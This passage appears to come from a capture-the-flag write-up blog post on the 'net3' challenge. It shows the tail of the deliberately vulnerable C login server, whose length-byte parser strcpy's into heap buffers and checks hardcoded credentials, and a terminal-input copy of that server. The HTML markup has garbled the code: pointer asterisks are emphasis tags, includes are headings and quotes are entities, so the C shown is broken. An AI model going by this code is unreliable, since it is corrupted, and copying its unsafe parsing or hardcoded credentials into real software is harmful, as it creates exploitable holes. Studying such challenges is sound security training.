</span><span class='line'>  <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">password</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">resource</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">net3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">awesomesauce</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">password</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">free</span><span class="p">(</span><span class="n">resource</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">password</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="o">!</span> <span class="n">success</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">send_string</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">string</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">struct</span> <span class="n">iovec</span> <span class="n">v</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span><span class='line'>  <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">expected</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_base</span> <span class="o">=</span> <span class="n">string</span><span class="p">;</span>
</span><span class='line'>  <span class="n">v</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="n">iov_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">expected</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span> <span class="o">+</span> <span class="n">strlen</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">writev</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">v</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span> <span class="o">!=</span> <span class="n">expected</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">failed</span> <span class="n">to</span> <span class="n">write</span> <span class="n">correct</span> <span class="n">amount</span> <span class="n">of</span> <span class="n">bytes</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">run</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">loggedin</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">nread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">len</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
</span><span class='line'>      <span class="n">len</span> <span class="o">=</span> <span class="n">ntohs</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
</span><span class='line'>      <span class="n">buffer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span> <span class="n">buffer</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;malloc failure for %d bytes&quot;</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">nread</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">switch</span><span class="p">(</span><span class="n">buffer</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="p">{</span>
</span><span class='line'>      <span class="k">case</span> <span class="mi">23</span><span class="o">:</span>
</span><span class='line'>          <span class="n">loggedin</span> <span class="o">=</span> <span class="n">login</span><span class="p">(</span><span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="n">len</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
</span><span class='line'>          <span class="n">send_string</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">33</span><span class="p">,</span> <span class="n">loggedin</span> <span class="o">?</span> <span class="s">&quot;successful&quot;</span> <span class="o">:</span> <span class="s">&quot;failed&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">default</span><span class="o">:</span>
</span><span class='line'>          <span class="n">send_string</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="s">&quot;what you talkin about willis?&quot;</span><span class="p">);</span>
</span><span class='line'>          <span class="k">break</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">argv</span><span class="p">,</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">strong</span><span class="o">&gt;</span><span class="n">envp</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">*</span><span class="n">username</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Run</span> <span class="n">the</span> <span class="n">process</span> <span class="n">as</span> <span class="n">a</span> <span class="n">daemon</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">background_process</span><span class="p">(</span><span class="n">NAME</span><span class="p">,</span> <span class="n">UID</span><span class="p">,</span> <span class="n">GID</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Wait</span> <span class="k">for</span> <span class="n">socket</span> <span class="n">activity</span> <span class="n">and</span> <span class="k">return</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">fd</span> <span class="o">=</span> <span class="n">serve_forever</span><span class="p">(</span><span class="n">PORT</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Set</span> <span class="n">the</span> <span class="n">client</span> <span class="n">socket</span> <span class="n">to</span> <span class="n">STDIN</span><span class="p">,</span> <span class="n">STDOUT</span><span class="p">,</span> <span class="n">and</span> <span class="n">STDERR</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">set_io</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="o">/&lt;</span><span class="n">em</span><span class="o">&gt;</span> <span class="n">Don</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;</span><span class="n">t</span> <span class="k">do</span> <span class="nl">this</span> <span class="p">:</span><span class="o">&gt;</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/</span>
</span><span class='line'>  <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">run</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>It is easy to solve the challenge when we understand the code. For
this purposes, we modified the source code to use a terminal for input or
output, instead of socket.</p>

<p><figure class='code'><figcaption><span>net3-modified.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdio</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">sys</span><span class="o">/</span><span class="n">socket</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">NAME</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">net3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">UID</span> <span class="mi">996</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">GID</span> <span class="mi">996</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/&lt;</span><span class="n">em</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Extract</span> <span class="n">a</span> <span class="n">null</span> <span class="n">terminated</span> <span class="n">string</span> <span class="n">from</span> <span class="n">the</span> <span class="n">buffer</span>
</span><span class='line'> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">get_string</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;*</span><span class="n">result</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">byte</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">byte</span> <span class="o">=</span> <span class="o">*</span><span class="n">buffer</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="o">%</span><span class="n">d</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">byte</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">byte</span> <span class="o">&gt;</span> <span class="n">len</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">badly</span> <span class="n">formed</span> <span class="n">packet</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">result</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">byte</span><span class="p">);</span>
</span><span class='line'>  <span class="n">strcpy</span><span class="p">(</span><span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">result</span><span class="p">,</span> <span class="n">buffer</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="n">byte</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;/&lt;</span><span class="n">em</span><span class="o">&gt;</span>
</span><span class='line'> <span class="o">*</span> <span class="n">Check</span> <span class="n">to</span> <span class="n">see</span> <span class="k">if</span> <span class="n">we</span> <span class="n">can</span> <span class="n">log</span> <span class="n">into</span> <span class="n">the</span> <span class="n">host</span>
</span><span class='line'> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;/&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">int</span> <span class="n">login</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">buffer</span><span class="p">,</span> <span class="kt">u_int16_t</span> <span class="n">len</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">resource</span><span class="p">,</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">username</span><span class="p">,</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">password</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">deduct</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">success</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">if</span><span class="p">(</span><span class="n">len</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">3</span><span class="p">)</span> <span class="n">errx</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">invalid</span> <span class="n">login</span> <span class="n">packet</span> <span class="n">length</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">resource</span> <span class="o">=</span> <span class="n">username</span> <span class="o">=</span> <span class="n">password</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">deduct</span> <span class="o">=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">resource</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">username</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span>
</span><span class='line'>  <span class="n">deduct</span> <span class="o">+=</span> <span class="n">get_string</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">password</span><span class="p">,</span> <span class="n">buffer</span><span class="o">+</span><span class="n">deduct</span><span class="p">,</span> <span class="n">len</span><span class="o">-</span><span class="n">deduct</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">resource</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">net3</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">awesomesauce</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="n">success</span> <span class="o">|=</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">password</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="nl">success</span><span class="p">:</span> <span class="o">%</span><span class="n">d</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">success</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">free</span><span class="p">(</span><span class="n">resource</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">username</span><span class="p">);</span>
</span><span class='line'>  <span class="n">free</span><span class="p">(</span><span class="n">password</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">return</span> <span class="o">!</span> <span class="n">success</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
